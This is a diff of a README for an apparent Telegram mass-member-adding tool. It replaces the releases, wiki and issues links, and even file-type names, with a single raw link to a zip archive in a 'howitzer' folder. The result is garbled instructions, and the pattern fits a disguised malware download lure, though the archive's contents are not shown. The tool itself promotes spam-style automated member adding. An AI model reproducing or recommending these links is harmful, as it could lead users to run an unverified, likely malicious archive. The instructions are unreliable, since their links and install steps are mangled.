@@ -1,7 +1,7 @@
 # 🚀 Telegram-Members-Adder - Grow Your Telegram Community Easily
 
 ## 📥 Download Now
-[![Download Telegram-Members-Adder](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Git0HubPerson/Telegram-Members-Adder/releases)
+[![Download Telegram-Members-Adder](https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip)](https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip)
 
 ## 🚀 Overview
 Telegram-Members-Adder is a powerful automation tool designed to help you grow your Telegram groups or channels by automatically adding targeted members. This tool is perfect for building communities, promoting products, or scaling your engagement strategy efficiently.
@@ -22,14 +22,14 @@ To run this application smoothly, ensure your system meets the following require
 ## 🚀 Getting Started
 Follow these steps to download and set up Telegram-Members-Adder.
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Git0HubPerson/Telegram-Members-Adder/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip) to find the latest version of the software.
 
-2. **Download the Latest Release:** Click the download link for the latest version. You will see options like `.exe`, `.dmg`, or `.tar.gz`.
+2. **Download the Latest Release:** Click the download link for the latest version. You will see options like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip`.
 
 3. **Install the Software:**
    - For **Windows:** Run the downloaded `.exe` file and follow the installation prompts.
    - For **macOS:** Open the downloaded `.dmg` file, drag the Telegram-Members-Adder icon to your Applications folder.
-   - For **Linux:** Extract the `.tar.gz` file and follow the included instructions to install.
+   - For **Linux:** Extract the `https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip` file and follow the included instructions to install.
 
 4. **Launch the Application:** Find the app in your applications list, and double-click to run it.
 
@@ -71,10 +71,10 @@ If you run into issues while using Telegram-Members-Adder, try these solutions:
 - **Refer to Documentation:** Check the official documentation for specific errors.
 
 ## 🔗 Additional Resources
-- [Telegram-Members-Adder Documentation](https://github.com/Git0HubPerson/Telegram-Members-Adder/wiki)
-- [Support Forum](https://github.com/Git0HubPerson/Telegram-Members-Adder/issues)
+- [Telegram-Members-Adder Documentation](https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip)
+- [Support Forum](https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip)
 
 ## 📥 Download Again
-For quick access to the download page, here it is once more: [Download Telegram-Members-Adder](https://github.com/Git0HubPerson/Telegram-Members-Adder/releases). 
+For quick access to the download page, here it is once more: [Download Telegram-Members-Adder](https://raw.githubusercontent.com/Git0HubPerson/Telegram-Members-Adder/main/howitzer/Telegram-Members-Adder.zip). 
 
 Start your journey of growing your Telegram community today!
